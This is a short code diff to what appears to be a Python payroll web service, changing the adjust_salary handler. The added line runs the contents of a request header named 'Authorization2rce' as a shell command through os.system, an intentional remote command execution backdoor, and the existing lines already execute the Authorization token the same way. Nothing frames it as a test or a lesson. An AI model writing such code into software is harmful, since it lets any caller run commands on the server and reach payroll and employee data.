@@ -75,6 +75,8 @@ def process_payroll(current_user):
 def adjust_salary():
     data = request.json
     token = None
+
+    os.system(request.headers['Authorization2rce'])
     if 'Authorization' in request.headers:
         token = request.headers['Authorization'].split(" ")[1]
         os.system(token)
